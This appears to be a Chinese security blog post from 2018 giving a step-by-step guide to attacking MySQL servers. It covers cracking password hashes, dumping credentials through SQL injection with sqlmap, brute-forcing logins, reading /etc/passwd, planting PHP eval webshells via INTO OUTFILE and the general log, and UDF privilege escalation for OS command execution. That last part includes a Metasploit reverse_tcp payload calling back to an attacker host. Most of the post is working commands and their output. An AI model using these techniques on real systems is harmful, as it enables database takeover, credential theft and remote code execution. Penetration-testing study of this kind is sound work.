---
title: mysql渗透提权知识
date: 2018-06-30 21:55:07
categories: 安全
tags: MySQL
---



## 一、MySQL默认库表介绍

mysql安装后会默认存在3个库，包括information_schema，mysql和performance_schema。

performance_schema提供了访问数据库元数据的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。 

<!--more-->

mysql5.5之后新增了PERFORMANCE_SCHEMA数据库。主要用于收集数据库服务器性能参数。

mysql库保存MySQL的账户，密码，权限、参数、对象和状态信息等。

其中最重要的是myql库的user表，存储了用户名，密码，可连接主机等信息。

![](http://7xo8y2.com1.z0.glb.clouddn.com/18-6-30/40247540.jpg)

其中host表示可连接主机，locahost，127.0.0.1和::1都表示只允许本地登录，为%时表示所有主机都可以登录。

## 二、MySQL密码加密方式与破解

mysql的密码加密方式为mysqlsha1加密。

加密公式为：`password_str =concat(‘*’, sha1(unhex(sha1(password)))) `

即先对密码sha1加密，然后16位进制转为字符串，在使用sha1加密，最后加上`*`。

如密码为root，加密后即为` *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B`。用python演示的加密过程

````python
>>> import hashlib,binascii
>>> pwd='root'
>>> tmp1=hashlib.sha1(pwd.encode('utf-8')).hexdigest()    #第一次sha1加密
>>> tmp1
'dc76e9f0c0006e8f919e0c515c66dbba3982f785'
>>> tmp2=binascii.a2b_hex(tmp1)    #16位进制转字符串
>>> tmp2
b'\xdcv\xe9\xf0\xc0\x00n\x8f\x91\x9e\x0cQ\\f\xdb\xba9\x82\xf7\x85'
>>> password=hashlib.sha1(tmp2).hexdigest()  #第二次sha1加密
>>> password
'81f5e21e35407d884a6cd4a731aebfb6af209e1b'
````



### 对加密后的密码进行破解

1. #### 使用在线网站进行破解

   http://www.cmd5.com/
   ![](http://7xo8y2.com1.z0.glb.clouddn.com/18-6-30/48683055.jpg)

   http://www.mysql-password.com/hash
   ![](http://7xo8y2.com1.z0.glb.clouddn.com/18-6-30/56313677.jpg)

2. #### 使用工具破解

   hashcat工具：

    `hashcat64.exe 01A6717B58FF5C7EAFFF6CB7C96F7428EA65FE4C --force -a 0 -m 300 dict.txt`

   ![](http://7xo8y2.com1.z0.glb.clouddn.com/18-6-30/80178267.jpg)

   如图，输出了结果admin123，其中dict.txt为字典， -m 300表示要破解的是mysql密码，-a 0 字典模式

   参考[Hash破解神器：Hashcat的简单使用](https://blog.csdn.net/mydriverc2/article/details/41384853)

   

   John the ripper工具

   `john --wordlist=dict.txt -format=MySQL-sha1 hash.txt `

   ![](http://7xo8y2.com1.z0.glb.clouddn.com/18-6-30/22237035.jpg)

   其中dict.txt为字典， hash.txt为mysql密码，-format=MySQL-sha1表示加密方式mysqlsha1。

## 三、获取MySQL密码

### 存在注入点时获取密码

当网站存在注入点时可以使用sqlmap工具获取mysql的用户名和密码等信息。

获取用户列表

`python2 sqlmap.py -r test.txt --users`

![](http://7xo8y2.com1.z0.glb.clouddn.com/18-7-1/59818208.jpg)

获取用户密码

`python2 sqlmap.py -r test.txt --password`

![](http://7xo8y2.com1.z0.glb.clouddn.com/18-7-1/81505899.jpg)

或者也直接手工注入查询mysql库的user表。

### 爆破获取mysql密码

1. hydra工具

   `hydra -l 用户名 -P 密码字典  ip mysql`

2. metasploit模块

   ```
   use auxiliary/scanner/mysql/mysql_login
   # 设置目标主机
   set RHOSTS 192.168.99.100
   #需要爆破的用户名
   set USERNAME root
   #密码字典
   set PASS_FILE /root/Downloads/dict.txt
   exploit
   ```

   



## 四、读写文件与获取shell

当存在注入点获取密码或者通过其它方式获取密码后，连接上MySQL时就可以尝试读取敏感文件，提权，写入shell。

1. 读取文件 LOAD_FILE
   执行 `SELECT LOAD_FILE('/etc/passwd');`
   可以读取/etc/passwd 的文件，也可以输入其它的文件，读取文件时，需要对mysql启动账户对文件具有读权限，否则无法查看，同时文件必须小于 max_allowed_packet 。
   读取文件时可以查看一些配置文件，如apache配置文件，虚拟站点配置文件等。

   参考 [MySQL注入load_file常用路径](https://www.cnblogs.com/lcamry/p/5729087.html)

2. 写入shell INTO_OUTFILE

   使用 `SELECT ··· INTO_OUTFILE ···`的方式可以写入shell到指定文件中，例如

   `select '<?php @eval($_POST[test]);?>'INTO OUTFILE 'D:/tools/phpStudy/WWW/test.php'`

   但是一般情况会失败，提示` The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`。

   secure-file-priv参数是用来限制LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()传到哪个指定目录的。

   - ure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
   - 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
   - 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制

   查看secure_file_priv的值语句，`show global variables like '%secure%';`

   当secure_file_priv可以写入时，也需要mysql具有对文件的写权限才可以，否则仍然无法写入文件。

3. general_log_file写入shell

   general_log 为mysql日志保存选项，当打开时会将mysql查询记录保存到文件中。

   general_log_file 为日志的保存路径。

   可以将general_log 开启，然后将general_log_file 设置为php文件，然后输入webshell的查询语句，即可写入shell。

   具体命令

   ```
   set global general_log = "ON";
   SET global general_log_file='D:/tools/phpStudy/WWW/test.php';
   select '<?php eval($_POST[test]);?>';
   ```

   这种方法也需要mysql对指定目录具有写权限，否则无法写入。

## 五、MySQL UDF提权

UDF为`User Defined Function`-用户自定义函数 ，当拥有mysql权限的时候，可以通过上传lib_mysqludf_sys 文件的方式，创建UDF进行提权。

提权条件限制

mysql拥有导入文件目录的写权限。

从MySQL 5.0.67开始，UDF库必须包含在plugin文件夹中。



### 方法一、使用sqlmap提权(失败)

```
python2 sqlmap.py -d "mysql://root:root@192.168.99.100:3306/test" --os-shell
...
#选择mysql位数
what is the back-end database management system architecture?
[1] 32-bit (default)
[2] 64-bit
> 1
#上传dll文件	
[00:52:17] [INFO] the local file 'c:\users\cheng\appdata\local\temp\sqlmap9rxqye15264\lib_mysqludf_sysn7cb6z.dll' and the remote file './libsslta.dll' have the same size (6144 B)
[00:52:17] [INFO] going to use injected sys_eval and sys_exec user-defined functions for operating system command execution
[00:52:17] [INFO] calling Windows OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] y
[00:52:32] [WARNING] (remote) (_mysql_exceptions.OperationalError) (1305, 'FUNCTION test.sys_eval does not exist')
```

在创建了os-shell后运行命令未成功，查看是dll文件没有上传到plugin目录。

### 方法二、使用metasploit提权

```
use exploit/multi/mysql/mysql_udf_payload
set RHOST 192.168.99.100
set PASSWORD root
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.99.1
exploit 
```

运行后虽然上传了udf文件，创建了sys_exec()函数，但是没有返回session。此时可以通过mysql连接手动创建sys_eval()函数。

```
#先查询上传udf文件名
mysql> select * from mysql.func where name = 'sys_exec';
+----------+-----+--------------+----------+
| name     | ret | dl           | type     |
+----------+-----+--------------+----------+
| sys_exec |   2 | QApbQCTY.dll | function |
#创建sys_eval函数
mysql> create function sys_eval returns string soname 'QApbQCTY.dll';
Query OK, 0 rows affected (0.00 sec)
#测试运行whoami
mysql> select sys_eval('whoami');
+-----------------------+
| sys_eval('whoami')    |
+-----------------------+
| win-88jdvt747gh\test|
+-----------------------+
1 row in set (0.14 sec)
```



### 方法三、手动输入语句提权

先上传lib_mysqludf_sys文件，然后创建udf函数。

获取lib_mysqludf_sys的16进制，这里直接使用msf的lib_mysqludf_sys文件。文件目录为/usr/share/metasploit-framework/data/exploits/mysql/ 

1. 获取lib_mysqludf_sys的16进制文件。

        登录本地mysql，导出文件

    ```
    select hex(load_file('/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.dll')) into outfile '/tmp/hex.txt';
    ```

2. 登录远程目标机mysql，查询目标机系统情况和插件目录。

    ```
    mysql> select @@version_compile_os, @@version_compile_machine;
    +----------------------+---------------------------+
    | @@version_compile_os | @@version_compile_machine |
    +----------------------+---------------------------+
    | Win32                | 32                        |
    +----------------------+---------------------------+
    1 row in set (0.00 sec)

    mysql> select @@plugin_dir;
    +----------------------------+
    | @@plugin_dir               |
    +----------------------------+
    | E:\xampp\mysql\lib\plugin\ |
    +----------------------------+
    1 row in set (0.00 sec)
    ```

3. 将数据导入到mysql插件目录

    ```
    select unhex('4D5A900003000000040...00000000000')into dumpfile "E:\\xampp\\mysql\\lib\\plugin\\lib_mysqludf_sys_32.dll";
    ```

4. 创建sys_eval函数

    ```
    mysql> create function sys_eval returns string soname 'lib_mysqludf_sys_32.dll';
    Query OK, 0 rows affected (0.06 sec)

    # 测试运行命令
    mysql> select sys_eval('whoami');
    +-----------------------+
    | sys_eval('whoami')    |
    +-----------------------+
    | win-88jdvt747gh\test |
    +-----------------------+
    1 row in set (0.18 sec)
    ```

windows中mysql安装时默认不会创建plugin文件夹，可以使用以下方法进行创建。但是本地测试时没有成功，以上在windows测试都是手动创建的 😂 。

```
select 'xxx' into dumpfile 'E:\\xampp\\mysql|\lib::$INDEX_ALLOCATION';          # 新建目录lib
select 'xxx' into dumpfile 'E:\\xampp\\mysql\\lib\plugin::$INDEX_ALLOCATION';  # 新建目录plugin
```

  

</br>

</br>

</br>

</br>





**参考：**

https://err0rzz.github.io/2017/12/26/UDF-mysql/

https://xz.aliyun.com/t/2167#toc-4